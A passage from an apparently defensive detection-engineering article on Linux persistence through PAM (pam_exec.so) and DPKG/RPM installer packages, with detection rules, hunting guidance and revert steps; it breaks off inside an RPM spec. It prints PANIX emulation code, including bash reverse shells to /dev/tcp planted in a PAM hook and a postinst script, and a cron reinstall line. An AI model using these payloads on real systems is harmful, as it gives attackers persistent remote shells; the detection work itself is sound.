<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">Category</th><th align="left">Coverage</th></tr></thead><tbody><tr><td align="left">File</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_creation.toml">Creation or Modification of Pluggable Authentication Module or Configuration</a> <a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_creation_in_unusual_dir.toml">Pluggable Authentication Module Creation in Unusual Directory</a> <a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td align="left">Process</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/discovery_pam_version_discovery.toml">Pluggable Authentication Module Version Discovery</a> <a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_source_download.toml">Pluggable Authentication Module Source Download</a></td></tr><tr><td align="left">Authentication</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_unusual_pam_grantor.toml">Authentication via Unusual PAM Grantor</a></td></tr></tbody></table></div>
<p>To revert any changes made to the system by PANIX, you can use the corresponding revert module by running:</p>
<pre><code>&gt; ./panix.sh --revert pam

[+] Searching for rogue PAM module
[+] Restored original PAM module &#x27;/lib/x86_64-linux-gnu/security/pam_unix.so&#x27;.
[+] Restarting SSH service...
[+] SSH service restarted successfully.</code></pre>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1556003---pluggable-authentication-modules-malicious-pam" class="absolute -top-32"></span>Hunting for T1556.003 - Pluggable Authentication Modules (Malicious PAM)</h3>
<p>Other than relying on detections, it is important to incorporate threat hunting into your workflow, especially for persistence mechanisms like these, where events can potentially be missed due to timing. This publication will solely list the available hunts for each persistence mechanism; however, more details regarding the basics of threat hunting are outlined in the “<em>Hunting for T1053 - scheduled task/job</em>” section of “<a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms"><em>Linux Detection Engineering -  A primer on persistence mechanisms</em></a>”. Additionally, descriptions and references can be found in our <a href="https://github.com/elastic/detection-rules">Detection Rules repository</a>, specifically in the <a href="https://github.com/elastic/detection-rules/tree/main/hunting">Linux hunting subdirectory</a>.</p>
<p>We can hunt for PAM persistence through <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html">ES|QL</a> and <a href="https://www.elastic.co/guide/en/kibana/current/osquery.html">OSQuery</a>, focusing on file creations (as this technique requires the compilation of modified PAM components) and modifications to PAM-related files and directories. The approach includes monitoring for the following:</p>
<ul>
<li><strong>Creations and/or modifications to PAM configuration files:</strong> Tracks changes to files in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/pam.d/</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/security/</code> directories and the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/pam.conf</code> file, which are commonly targeted for PAM persistence.</li>
</ul>
<p>By combining the <a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_pluggable_authentication_module.md">Persistence via Pluggable Authentication Modules</a> hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to <a href="https://attack.mitre.org/techniques/T1556/003/">T1556.003</a>.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1556003---pluggable-authentication-modules-pam_execso" class="absolute -top-32"></span>T1556.003 - Pluggable Authentication Modules: pam_exec.so</h2>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pam_exec.so</code> module, part of the PAM framework, allows administrators to execute external commands or scripts during the authentication process. This flexibility is powerful for extending authentication workflows with tasks like logging, additional security checks, or notifications. However, this same capability can be exploited by attackers to log passwords or execute backdoors, enabling malicious scripts to run when users authenticate.</p>
<p>To understand how <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pam_exec.so</code> can be configured, consider the following excerpt from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/pam.d/common-auth</code>, a file that defines the authentication scheme for Linux systems:</p>
<pre><code># /etc/pam.d/common-auth - authentication settings common to all services

# Primary modules
auth [success=1 default=ignore] pam_unix.so nullok_secure

# Fallback if no module succeeds
auth requisite pam_deny.so

# Ensure a positive return value if none is set
auth required pam_permit.so</code></pre>
<p>This file controls how authentication is processed for all services. Each line defines a module and its behavior. For instance:</p>
<ul>
<li>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">auth</code> keyword indicates that the module operates during the authentication phase.</li>
<li>Control flags, like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[success=1 default=ignore]</code>, specify how PAM interprets the module&#x27;s result. For example, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">success=1</code> skips the next module if the current one succeeds.</li>
<li>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">requisite</code> flag immediately denies authentication if the module fails:<!-- -->
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">auth requisite pam_deny.so</code></li>
</ul>
</li>
<li>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">required</code> flag ensures the module must succeed for authentication to proceed, though subsequent modules in the stack will still execute:<!-- -->
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">auth required pam_permit.so</code></li>
</ul>
</li>
</ul>
<p>Modules such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pam_unix.so</code> handle traditional UNIX authentication by validating user credentials against <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/shadow</code>. Together, these components define the authentication process and dictate how the system responds to various conditions. For more information and examples, visit the <a href="https://linux.die.net/man/5/pam.d">pam.d man page</a>.</p>
<p>One way of abusing this mechanism is by leveraging the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pam_exec.so</code> module to execute an arbitrary script upon authentication through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/pam.d/sshd</code>. By providing the path to a backdoor script on the host system, we can ensure that our backdoor is executed on every successful SSH authentication. <a href="https://www.group-ib.com/">Group-IB</a> wrote about this technique in a recent publication dubbed “<a href="https://www.group-ib.com/blog/pluggable-authentication-module/"><em>The Duality of the Pluggable Authentication Module (PAM)</em></a>”.</p>
<p>A second method involves the modification of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/pam.d/common-auth</code> for Debian-based systems or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/pam.d/sshd</code> for Fedora-based systems to log user credentials. This technique was earlier discussed in <a href="https://embracethered.com/blog/">Wunderwuzzi’s blog</a> called “<a href="https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/"><em>Post Exploitation: Sniffing Logon Passwords with PAM</em></a>”. While capturing credentials isn&#x27;t technically a persistence mechanism, it enables ongoing access to a host by leveraging stolen credentials.</p>
<p>In the next section we will take a look at how to implement arbitrary command execution through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pam_exec.so</code> using PANIX.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1556003---pluggable-authentication-modules-pam_execso" class="absolute -top-32"></span>Persistence through T1556.003 - Pluggable Authentication Modules: pam_exec.so</h3>
<p>To better understand the technique, we will take a look at the <a href="https://github.com/Aegrah/PANIX/blob/main/modules/setup_pam.sh">setup_pam.sh</a> PANIX module.</p>
<pre><code>echo -e &quot;#!/bin/bash\nnohup setsid /bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1&#x27; &amp;&quot; &gt; /bin/pam_exec_backdoor.sh

chmod 700 /bin/pam_exec_backdoor.sh

pam_sshd_file=&quot;/etc/pam.d/sshd&quot;
pam_line=&quot;session optional pam_exec.so seteuid /bin/pam_exec_backdoor.sh&quot;</code></pre>
<p>The first step is to create the backdoor script to execute, this can be any C2 beacon, reverse shell or other means of persistence. PANIX creates a simple reverse shell and grants it execution permissions. Once the backdoor in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin/pam_exec_backdoor.sh</code> is in place, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/pam.d/sshd</code> file is modified. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">session</code> keyword ensures the script runs during user session setup or teardown, while <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">seteuid</code> ensures the script runs with the effective user ID (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">eUID</code>) of the authenticated user instead of root.</p>
<p>Since the detection methods for the password harvesting module are quite similar to those of the backdoor module, we will focus on discussing the backdoor module in detail. You are encouraged to explore the <a href="https://github.com/Aegrah/PANIX/blob/7a9cf39b35b40ee64bfe6b510f685003ebc043ae/modules/setup_pam.sh#L257">password-harvesting module</a> on your own!</p>
<p>Let’s run the PANIX module with the following command line arguments:</p>
<pre><code>&gt; sudo ./panix.sh --pam --pam-exec --backdoor --ip 192.168.100.1 --port 2015

[+] Creating reverse shell script at /bin/pam_exec_backdoor.sh...
[+] /bin/pam_exec_backdoor.sh created and permissions set to 700.
[+] Modifying /etc/pam.d/sshd to include the PAM_EXEC rule...
[+] PAM_EXEC rule added to /etc/pam.d/sshd.
[+] Restarting SSH service to apply changes...
[+] SSH service restarted successfully.
[+] PAM_EXEC reverse shell backdoor planted!

Authenticate to trigger the reverse shell.

[+] PAM persistence established!</code></pre>
<p>After triggering the reverse shell by authentication, we can analyze the logs in Discover:</p>
<p></p>
<p>After PANIX executes, it creates and grants execution permissions to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin/pam_exec_backdoor.sh</code> backdoor. Next, the backdoor configuration is added to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/pam.d/sshd</code> file, and the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SSHD</code> service is restarted. Upon authentication, we can see the execution of the backdoor by the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SSHD</code> parent process, starting the reverse shell chain (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pam_exec_backdoor.sh</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nohup</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">setsid</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bash</code>).</p>
<p>Let’s review the coverage. The key distinction between this technique and the previous one is that this method relies on configuration changes rather than compiling a new PAM module, requiring a different set of detection rules to address the threat effectively:</p>
<p><em>Detection and endpoint rules that cover pam_exec.so persistence</em></p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">Category</th><th align="left">Coverage</th></tr></thead><tbody><tr><td align="left">File</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_creation.toml">Creation or Modification of Pluggable Authentication Module or Configuration</a> <a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td align="left">Process</td><td align="left"><a href="https://github.com/elastic/protections-artifacts/blob/8a9e857453566068088f5a24cc1f39b839e60fe8/behavior/rules/linux/persistence_potential_backdoor_execution_through_pam_exec.toml">Potential Backdoor Execution Through PAM_EXEC</a> <a href="https://github.com/elastic/detection-rules/blob/e528feb989d8fc7f7ca8c4100c0bf5ca7b912a5d/rules/linux/persistence_unusual_sshd_child_process.toml">Unusual SSHD Child Process</a></td></tr></tbody></table></div>
<p>To revert any changes, you can use the corresponding revert module by running:</p>
<pre><code>&gt; ./panix.sh --revert pam

[+] Removing PAM_EXEC backdoor...
[+] Removed &#x27;/bin/pam_exec_backdoor.sh&#x27;.
[+] Removed PAM_EXEC line from &#x27;/etc/pam.d/sshd&#x27;.
[+] Restarting SSH service...
[+] SSH service restarted successfully.
[-] PAM_EXEC line not found in &#x27;/etc/pam.d/common-auth&#x27;.</code></pre>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1556003---pluggable-authentication-modules-pam_execso" class="absolute -top-32"></span>Hunting for T1556.003 - Pluggable Authentication Modules: pam_exec.so</h3>
<p>We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to its use. This technique relies on altering PAM configuration files, rather than compilation to execute commands or scripts. The approach includes monitoring for the following:</p>
<ul>
<li><strong>Child processes spawned from SSH:</strong> Tracks processes initiated via SSH sessions, as these may indicate the misuse of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pam_exec.so</code> for persistence.</li>
<li><strong>Creations and/or modifications to PAM configuration files:</strong> Tracks changes to files in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/pam.d/</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/security/</code> directories and the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/pam.conf</code> file, which are commonly targeted for PAM persistence.</li>
</ul>
<p>By combining the <a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_pluggable_authentication_module.md">Persistence via Pluggable Authentication Modules</a> hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to <a href="https://attack.mitre.org/techniques/T1556/003/">T1556.003</a>.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="t1546016---event-triggered-execution-installer-packages" class="absolute -top-32"></span>T1546.016 - Event Triggered Execution: Installer Packages</h1>
<p>Package managers are used to install, update, and manage software packages. While these tools streamline software management, they can also be abused by attackers to gain initial access or achieve persistence. By hijacking the package manager&#x27;s execution flow, attackers can insert malicious code that executes during routine package management tasks, such as package installation or updates. This technique is tracked by MITRE under the identifier <a href="https://attack.mitre.org/techniques/T1546/016/">T1546.016</a>.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1546016---installer-packages-dpkg--rpm" class="absolute -top-32"></span>T1546.016 - Installer Packages: DPKG &amp; RPM</h2>
<p>Popular managers include <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">DPKG</code> (Debian Package) for Debian-based distributions and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RPM</code> (Red Hat Package Manager) for Red Hat-based systems.</p>
<p><strong>1. DPKG (Debian Package Manager)</strong></p>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">DPKG</code>, the Debian package manager, processes <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.deb</code> packages and supports lifecycle scripts such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">preinst</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">postinst</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">prerm</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">postrm</code>. These scripts run at different stages of the package lifecycle, making them a potential target for executing malicious commands. A potential DPKG package file structure used for malicious intent could look like this:</p>
<pre><code>malicious_package/├── DEBIAN/
    ├── control
    ├── postinst</code></pre>
<p>Where the post-installation script (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">postinst</code>) runs immediately after a package is installed, allowing the attacker to gain initial access or establish persistence through malicious code.</p>
<p>Upon installation, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">DPKG</code> scripts (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">preinst</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">postinst</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">prerm</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">postrm</code>) will be stored in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/lib/dpkg/info/</code> directory and executed. Package installation logs are stored in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/log/dpkg.log</code>, and record commands like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dpkg -i</code> and the package names.</p>
<p><strong>2. RPM (Red Hat Package Manager)</strong></p>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RPM</code>, the Red Hat Package Manager, is the default package manager for Red Hat-based distributions like Fedora, CentOS, and RHEL. It processes <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.rpm</code> packages and supports script sections such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">%pre</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">%post</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">%preun</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">%postun</code>, which execute at various stages of the package lifecycle. These scripts can be exploited by attackers to run arbitrary commands during installation, removal, or updates.</p>
<p>A typical malicious RPM package might include a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">%post</code> script embedded directly in the package’s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">spec</code> file. For example, a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">%post</code> script could launch a reverse shell or modify critical system configurations immediately after the package installation completes. An example package layout could look as follows:</p>
<pre><code>~/rpmbuild/
├── SPECS/
│    ├── malicious_package.spec
├── BUILD/
├── RPMS/
├── SOURCES/
├── SRPMS/</code></pre>
<p>Upon installation, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RPM</code> runs the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">%post</code> script, allowing the attacker to execute the payload. The package manager logs installation activity in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/log/rpm.log</code>, which includes the names and timestamps of installed packages. Additionally, the built <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RPM</code> package is stored in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/lib/rpm/</code>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1546016---installer-packages-dpkg--rpm" class="absolute -top-32"></span>Persistence through T1546.016 - Installer Packages: DPKG &amp; RPM</h3>
<p>PANIX can establish persistence through both <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">DPKG</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RPM</code> within the <a href="https://github.com/Aegrah/PANIX/blob/ae404d5caf74c772436ccaaa0c3ab51cba8c4250/modules/setup_malicious_package.sh">setup_malicious_package.sh</a> module. Starting with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">DPKG</code>, the directory structure is created, the control file is written and the payload is added to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">postinst</code> file:</p>
<pre><code># DPKG package setup
PACKAGE_NAME=&quot;panix&quot;
PACKAGE_VERSION=&quot;1.0&quot;
DEB_DIR=&quot;${PACKAGE_NAME}/DEBIAN&quot;
PAYLOAD=&quot;#!/bin/sh\nnohup setsid bash -c &#x27;bash -i &gt;&amp; /dev/tcp/${ip}/${port} 0&gt;&amp;1&#x27; &amp;&quot;

# Create directory structure
mkdir -p ${DEB_DIR}

# Write postinst script
echo -e &quot;${PAYLOAD}&quot; &gt; ${DEB_DIR}/postinst
chmod +x ${DEB_DIR}/postinst

# Write control file
echo &quot;Package: ${PACKAGE_NAME}&quot; &gt; ${DEB_DIR}/control
echo &quot;Version: ${PACKAGE_VERSION}&quot; &gt;&gt; ${DEB_DIR}/control
echo &quot;Architecture: all&quot; &gt;&gt; ${DEB_DIR}/control
echo &quot;Maintainer: https://github.com/Aegrah/PANIX&quot; &gt;&gt; ${DEB_DIR}/control
echo &quot;Description: This malicious package was added through PANIX&quot; &gt;&gt; ${DEB_DIR}/control</code></pre>
<p>Afterwards, all that is left is to build the package with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dpkg-deb</code> and install it through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dpkg</code>.</p>
<pre><code># Build the .deb package
dpkg-deb --build ${PACKAGE_NAME}

# Install the .deb package
dpkg -i ${PACKAGE_NAME}.deb</code></pre>
<p>Upon installation, or updating of the package, the payload will be executed. In order to persist on a regular interval, any other persistence mechanism can be used. PANIX leverages <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Cron</code>:</p>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">echo &quot;*/1 * * * * /var/lib/dpkg/info/${PACKAGE_NAME}.postinst configure &gt; /dev/null 2&gt;&amp;1&quot; | crontab -</code></p>
<p>To forcefully install the package on a certain interval. This is of course not a stealthy mechanism, but serves as a proof of concept to emulate the technique. Let’s run the payload, and analyze the simulated events in Kibana:</p>
<pre><code>sudo ./panix.sh --malicious-package --dpkg --ip 192.168.100.1 --port 2019
dpkg-deb: building package &#x27;panix&#x27; in &#x27;panix.deb&#x27;.
Preparing to unpack panix.deb ...
Unpacking panix (1.0) over (1.0) ...
Setting up panix (1.0) ...
nohup: appending output to &#x27;nohup.out&#x27;
[+] Malicious package persistence established.</code></pre>
<p>Looking at the events generated in Kibana, we can see the following sequence:</p>
<p></p>
<p>PANIX is executed via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo</code>, after which the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">postinst</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">control</code> files are created. The package is then built using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dpkg-deb</code>, and installed with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dpkg -i</code>. Here we can see the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/lib/dpkg/info/panix.postinst</code> executing the reverse shell execution chain (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nohup</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">setsid</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bash</code>). After installation, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">crontab</code> is altered to establish persistence on a one-minute interval.</p>
<p><strong>RPM</strong></p>
<p>For <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RPM</code>, a similar flow as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">DPKG</code> is leveraged. The package is set up using the correct <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RPM</code> package structure, and the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">%post</code> section is set to contain the payload that gets triggered after installation:</p>
<pre><code># RPM package setup
PACKAGE_NAME=&quot;panix&quot;
PACKAGE_VERSION=&quot;1.0&quot;
cat &lt;&lt;-EOF &gt; ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec
Name: ${PACKAGE_NAME}
Version: ${PACKAGE_VERSION}
Release: 1%{?dist}
Summary: RPM package with payload script
License: MIT

%description
RPM package with a payload script that executes a reverse shell.

%prep
# No need to perform any preparation actions

%install
# Create directories
